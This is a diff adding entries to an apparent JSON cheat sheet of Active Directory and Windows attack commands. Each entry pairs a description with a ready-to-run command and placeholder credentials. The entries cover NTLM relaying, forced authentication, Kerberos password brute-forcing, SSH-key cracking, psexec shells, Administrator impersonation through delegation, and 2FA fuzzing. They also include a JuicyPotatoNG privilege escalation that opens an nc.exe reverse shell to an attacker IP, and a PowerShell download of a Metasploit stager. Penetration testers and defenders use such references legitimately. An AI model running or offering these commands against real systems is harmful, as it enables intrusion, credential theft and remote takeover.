+    "description": "SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for accessible SMB shares, both local and mapped drives, using valid credentials.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tSMB Hosts: smb-hosts.txt\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -L\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ShawnDEvans/smbmap",
+      "https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/"
+    ],
+    "name": "SMBMap-Enum-Share"
+  },
+  {
+    "description": "Impacket's rpcdump.py enumerates Remote Procedure Call (RPC) endpoints.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 rpcdump.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "RPC"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py",
+      "https://www.hackingarticles.in/impacket-guide-smb-msrpc/"
+    ],
+    "name": "Impacket-RPCDump"
+  },
+  {
+    "description": "sshng2john is a tool used to convert SSH private keys in OpenSSH format to a format that can be cracked using password cracking tools like John the Ripper. This can finally result in cracking the password of the private key.\n\nCommand Reference:\n```\nPrivate SSH key: id_rsa\n```\n",
+    "command": "sshng2john.py id_rsa\n",
+    "code": "john --wordlist=/opt/wordlists/rockyou.txt sshkey.john\n",
+    "items": [
+      "SSH_key"
+    ],
+    "services": [
+      "SSH"
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "Cracking"
+    ],
+    "references": [
+      "https://github.com/truongkma/ctf-tools/blob/master/John/run/sshng2john.py",
+      "https://github.com/Kyuu-Ji/htb-write-up/blob/master/tenten/write-up-tenten.md"
+    ],
+    "name": "SSHngtojohn"
+  },
+  {
+    "description": "\"Airport\" in macOS, accessed via the \"System Information\" app or Terminal with options like -s and -I, provides in-depth WiFi statistics with a security focus. The -s flag lists WiFi networks with security information like encryption type, while -I delivers comprehensive details about a specific network, aiding users and administrators in assessing the security posture of wireless connections. This feature empowers users to make informed decisions and take measures to enhance the security of their WiFi interactions on Mac devices.\n\nCommand Reference:\n```\n-s: Perform a wireless broadcast scan.\n\n-I: Print current wireless status, e.g. link auth, signal info, BSSID, port type etc.\n```\n",
+    "command": "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s\n",
+    "code": "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Mac"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "General"
+    ],
+    "references": [
+      "https://ss64.com/osx/airport.html"
+    ],
+    "name": "Airport"
+  },
+  {
+    "description": "Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).\n\nThe below command creates an SMB relay server that targets the IP 10.10.10.1, meaning any credentials that the SMB server recieves, gets relayed to that IP to attempt to authenticate and create a socks connection to the host. In order for the SMB server to recieve credentials to relay, dementor.py or Petitpotam can be used to trigger a forced authentication from the IP it's targeting to an attacker controlled SMB server.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
+    "command": "python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -socks\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "NTLM",
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py",
+      "https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack"
+    ],
+    "name": "Impacket-NTLMRelayX-Socks"
+  },
+  {
+    "description": "SMBMap is a tool used to enumerate SMB share drives, including listing share drive permissions, share contents, upload/download functionality, file name enumeration, and remote command execution. The following command will enumerate a list of SMB hosts for files and filenames containing the keyword 'password'.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tSMB Hosts: smb-hosts.txt\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 smbmap.py --host-file smb-hosts.txt -u john -p 'password123' -d test.local -F password\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ShawnDEvans/smbmap",
+      "https://www.nopsec.com/blog/smbmap-wield-it-like-the-creator/"
+    ],
+    "name": "SMBMap-Enum-File"
+  },
+  {
+    "description": "(New-Object Net.WebClient).DownloadFile is a PowerShell command that uses the .NET WebClient class to download a file from the server and saves it in a local directory.\n\nCommand Reference:\n\n\tWebserver: http://172.16.56.128:8999/msfstaged.exe\n\n\tFile name: msfstaged.exe\n",
+    "command": "(New-Object Net.WebClient).DownloadFile('http://172.16.56.128:8999/msfstaged.exe', 'msfstaged.exe')\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "General"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-7.0",
+      "https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters"
+    ],
+    "name": "DownloadFile"
+  },
+  {
+    "description": "ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of credentials (in the format `username:password`).\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tCredential List: credentials.txt\n",
+    "command": "cat credentials.txt | kerbrute_linux_amd64 -d test.local bruteforce -\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ropnop/kerbrute"
+    ],
+    "name": "Kerbrute-BruteForce"
+  },
+  {
+    "description": "Impacket's smbclient.py is a generic smbclient, allowing you to list shares and files, rename, upload and download files and create and delete directories.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 smbclient.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py",
+      "https://www.hackingarticles.in/impacket-guide-smb-msrpc/"
+    ],
+    "name": "Impacket-SMBClient"
+  },
+  {
+    "description": "Rubeus' `brute` module bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of usernames and a list of passwords.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tUsername List: usernames.txt\n\n\tPassword List: passwords.txt\n\n\tOutput File: found_passwords.txt\n",
+    "command": "Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus",
+      "https://github.com/GhostPack/Rubeus#brute"
+    ],
+    "name": "Rubeus-Brute"
+  },
+  {
+    "description": "Just another Windows Local Privilege Escalation from Service Account to System. Requires 'whoami /priv' SeImpersonatePrivilege. \n\nCommand Reference:\n```\n-t createprocess call: both (*)\n\n-p <program>: nc.exe\n\n-a <argument>: 10.10.14.19 5555 -e cmd.exe\n```\n",
+    "command": "JuicyPotatoNG.exe -t * -p \"nc.exe\" -a \"10.10.14.19 5555 -e cmd.exe\"\n",
+    "code": "SeImpersonatePrivilege        Impersonate a client after authentication   Enabled \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc"
+    ],
+    "references": [
+      "https://github.com/antonioCoco/JuicyPotatoNG",
+      "https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505"
+    ],
+    "name": "JuicyPotatoNG"
+  },
+  {
+    "description": "dementor.py interacts with the printer spooler on a host to trigger an authentication from the target IP to an attacker controlled host (usually an SMB or HTTP server). This captured authentication can then be relayed to authenticated to other hosts. See more in ntlmrelayx.py.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "RPC",
+      "NTLM"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc",
+      "https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack"
+    ],
+    "name": "Dementor"
+  },
+  {
+    "description": "Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host. Or can also be used to find writable shares on the target machine.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 psexec.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py",
+      "https://www.sans.org/blog/psexec-python-rocks/"
+    ],
+    "name": "Impacket-PsExec"
+  },
+  {
+    "description": "windapsearch enumerates users, groups, and computers from a Windows domain through LDAP queries. The following command enumerates all 3 of the above mentioned using provided credentials.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n\n\tEnum Users: -U\n\n\tEnum Groups: -G\n\n\tEnum Domain Admins: --da\n\n\tEnum members of group: -m \"Remote Desktop Users\"\n\n\tEnum Computers and resolve DNS: -C -r\n",
+    "command": "python3 windapsearch --dc-ip 10.10.10.1 -u test.local\\\\john -p password123 -U -G --da -m \"Remote Desktop Users\" -C -r\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "references": [
+      "https://github.com/ropnop/windapsearch",
+      "https://www.attackdebris.com/?p=470"
+    ],
+    "name": "Windapsearch"
+  },
+  {
+    "description": "Smbclient is a tool used to communicate with SMB servers. The following command will connect to an SMB share `public` using anonymous login.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tSMB Share: public\n",
+    "command": "smbclient \\\\\\\\test.local\\\\public -I 10.10.10.1 -N\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html",
+      "https://www.madirish.net/59"
+    ],
+    "name": "SMBClient-Enum-Share-Anonymous"
+  },
+  {
+    "description": "netstat is a command-line network tool that is a handy for enumerating services that are running on a machine. This command shows all the active network services using the TCP protocol.\n\nCommand Reference:\n```\nprotocol: tcp ( udp, icmp, ip, tcpv6, udpv6, icmpv6, or ipv6.)\n\n-a: Displays all active TCP connections and the TCP and UDP ports on which the computer is listening.\n\n-o: Displays active TCP connections and includes the process ID (PID) for each connection.\n\n-n: Displays active TCP connections, however, addresses and port numbers are expressed numerically and no attempt is made to determine names.\n```\n",
+    "command": "netstat -aon -p tcp\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://geekflare.com/netstat-command-usage-on-windows/",
+      "LINK"
+    ],
+    "name": "Netstat-windows"
+  },
+  {
+    "description": "ffuf is a fast web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records)and GET and POST parameter fuzzing. \n\nCommand Reference:\n```\nBurprequest in file: req\n\nProtocol: https\n\nWordlist with placeholder to replace (FUZZ): /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ\n\n```\n",
+    "command": "ffuf -request req -request-proto https -w /usr/share/wordlists/seclists/Fuzzing/6-digits-000000-999999.txt:FUZZ > ffuf.out\n",
+    "code": "POST /2fa.html HTTP/2\nHost: teamcity-dev.coder.htb\nCookie: __test=1; RememberMe=394468061^2#-7089909565306817793; TCSESSIONID=55B00B03A2687F2331142FB623BF2CCC\nAccept: application/json\nOrigin: https://teamcity-dev.coder.htb\n\npassword=FUZZ  \n",
+    "items": [
+      "No_creds"
+    ],
+    "services": [
+      "Web"
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ffuf/ffuf",
+      "https://www.freecodecamp.org/news/web-security-fuzz-web-applications-using-ffuf/"
+    ],
+    "name": "ffuf-request"
+  },
+  {
+    "description": "Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tService: www\n\n\tHost Name: server01.test.local\n\n\tUsername: john\n\n\tPassword: password123\n\n\tImpersonated User: Administrator\n",
+    "command": "python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "PrivEsc",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py",
+      "http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html"
+    ],
+    "name": "Impacket-getST-Creds"
+  },
+  {
+    "description": "SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and will use the provided LDAP credentials when performing LDAP collection methods, and stores the output in a zip file that can be directly placed in the BloodHound GUI.\n\nCommand Reference:\n\n\tLDAP Username: john\n\n\tLDAP Password: password123\n\n\tOutput File: output.zip\n",
+    "command": "SharpHound.exe --CollectionMethod All --LdapUsername john --LdapPassword password123 --ZipFileName output.zip\n",
+    "items": [
+      "Shell",
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc",
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/BloodHoundAD/SharpHound3",
+      "https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html"
+    ],
+    "name": "SharpHound-LDAP"
+  }
+]
